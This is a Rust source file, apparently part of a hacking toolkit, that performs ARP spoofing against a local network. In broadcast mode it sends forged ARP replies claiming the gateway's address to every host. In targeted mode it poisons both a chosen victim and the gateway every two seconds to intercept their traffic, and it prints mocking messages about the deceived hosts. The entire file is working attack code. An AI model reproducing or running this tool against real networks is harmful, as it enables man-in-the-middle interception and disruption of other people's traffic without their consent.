use crate::{get_interface_input, mac};
use pnet::datalink::{self, Channel::Ethernet, MacAddr};
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use std::io::{self, Write, stdin};
use std::net::Ipv4Addr;
use std::str::FromStr;
use std::{thread, time::Duration};

pub(crate) fn main() {
    print!("Mode (broadcast/targeted): ");
    io::stdout().flush().unwrap();
    let mut mode = String::new();
    stdin().read_line(&mut mode).unwrap();
    let mode = mode.trim().to_ascii_lowercase();

    print!("Gateway IP: ");
    io::stdout().flush().unwrap();
    let mut gateway_ip = String::new();
    stdin().read_line(&mut gateway_ip).unwrap();
    let gateway_ip = gateway_ip.trim().to_string();

    let iface = get_interface_input();

    let victim_ip = if mode == "targeted" {
        print!("Victim IP: ");
        io::stdout().flush().unwrap();
        let mut victim_ip_input = String::new();
        stdin().read_line(&mut victim_ip_input).unwrap();
        Some(Ipv4Addr::from_str(victim_ip_input.trim()).expect("Invalid victim IP"))
    } else {
        None
    };

    let gateway_ip_addr = Ipv4Addr::from_str(&gateway_ip).unwrap();

    let attacker_mac = mac_address::mac_address_by_name(&iface)
        .unwrap()
        .unwrap()
        .bytes();
    let attacker_mac = MacAddr::new(
        attacker_mac[0],
        attacker_mac[1],
        attacker_mac[2],
        attacker_mac[3],
        attacker_mac[4],
        attacker_mac[5],
    );

    let interfaces = datalink::interfaces();
    let interface = interfaces
        .into_iter()
        .find(|i| i.name == iface)
        .expect("Interface not found");

    let (mut tx, mut rx) = match datalink::channel(&interface, Default::default()) {
        Ok(Ethernet(tx, rx)) => (tx, rx),
        _ => panic!("Failed to open datalink channel"),
    };

    println!("Starting ARP spoofing... Press Ctrl+C to stop");

    if mode == "broadcast" {
        let attacker_mac = interface.mac.unwrap();

        thread::spawn(move || {
            loop {
                match rx.next() {
                    Ok(packet) => {
                        if let Some(ethernet) = EthernetPacket::new(packet) {
                            println!(
                                "{} thinks i am da router haha hehe",
                                ethernet.get_source()
                            );
                        }
                    }
                    Err(_) => {}
                }
            }
        });

        loop {
            let mut arp_buffer = [0u8; 28];
            let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
            arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet.set_protocol_type(EtherTypes::Ipv4);
            arp_packet.set_hw_addr_len(6);
            arp_packet.set_proto_addr_len(4);
            arp_packet.set_operation(ArpOperations::Reply);
            arp_packet.set_sender_hw_addr(attacker_mac);
            arp_packet.set_sender_proto_addr(gateway_ip_addr);
            arp_packet.set_target_hw_addr(MacAddr::broadcast());
            arp_packet.set_target_proto_addr(Ipv4Addr::new(0, 0, 0, 0));

            let mut ethernet_buffer = [0u8; 42];
            let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
            ethernet_packet.set_destination(MacAddr::broadcast());
            ethernet_packet.set_source(attacker_mac);
            ethernet_packet.set_ethertype(EtherTypes::Arp);
            ethernet_packet.set_payload(arp_packet.packet_mut());

            let _ = tx.send_to(ethernet_packet.packet(), None);
            thread::sleep(Duration::from_secs(2));
        }
    } else if let Some(victim_ip) = victim_ip {
        let victim_mac = mac::find_mac(&iface, &victim_ip.to_string(), "Victim")
            .expect("Victim MAC not found. Is the host up?");
        let gateway_mac = mac::find_mac(&iface, &gateway_ip_addr.to_string(), "Gateway")
            .expect("Gateway MAC not found. Is the host up?");

        loop {
            let mut arp_buffer1 = [0u8; 28];
            let mut arp_packet1 =
                MutableArpPacket::new(&mut arp_buffer1).expect("Failed to create ARP packet");
            arp_packet1.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet1.set_protocol_type(EtherTypes::Ipv4);
            arp_packet1.set_hw_addr_len(6);
            arp_packet1.set_proto_addr_len(4);
            arp_packet1.set_operation(ArpOperations::Reply);
            arp_packet1.set_sender_hw_addr(attacker_mac);
            arp_packet1.set_sender_proto_addr(gateway_ip_addr);
            arp_packet1.set_target_hw_addr(victim_mac);
            arp_packet1.set_target_proto_addr(victim_ip);

            let mut ethernet_buffer1 = [0u8; 42];
            let mut ethernet_packet1 =
                MutableEthernetPacket::new(&mut ethernet_buffer1).unwrap();
            ethernet_packet1.set_destination(victim_mac);
            ethernet_packet1.set_source(attacker_mac);
            ethernet_packet1.set_ethertype(EtherTypes::Arp);
            ethernet_packet1.set_payload(arp_packet1.packet_mut());

            let mut arp_buffer2 = [0u8; 28];
            let mut arp_packet2 =
                MutableArpPacket::new(&mut arp_buffer2).expect("Failed to create ARP packet");
            arp_packet2.set_hardware_type(ArpHardwareTypes::Ethernet);
            arp_packet2.set_protocol_type(EtherTypes::Ipv4);
            arp_packet2.set_hw_addr_len(6);
            arp_packet2.set_proto_addr_len(4);
            arp_packet2.set_operation(ArpOperations::Reply);
            arp_packet2.set_sender_hw_addr(attacker_mac);
            arp_packet2.set_sender_proto_addr(victim_ip);
            arp_packet2.set_target_hw_addr(gateway_mac);
            arp_packet2.set_target_proto_addr(gateway_ip_addr);

            let mut ethernet_buffer2 = [0u8; 42];
            let mut ethernet_packet2 =
                MutableEthernetPacket::new(&mut ethernet_buffer2).unwrap();
            ethernet_packet2.set_destination(gateway_mac);
            ethernet_packet2.set_source(attacker_mac);
            ethernet_packet2.set_ethertype(EtherTypes::Arp);
            ethernet_packet2.set_payload(arp_packet2.packet_mut());

            let _ = tx.send_to(ethernet_packet1.packet(), None);
            let _ = tx.send_to(ethernet_packet2.packet(), None);

            println!(
                "telling {} that i am the gateway >:) && telling {} i am the victim >:)",
                victim_mac, gateway_mac
            );

            thread::sleep(Duration::from_secs(2));
        }
    }
}
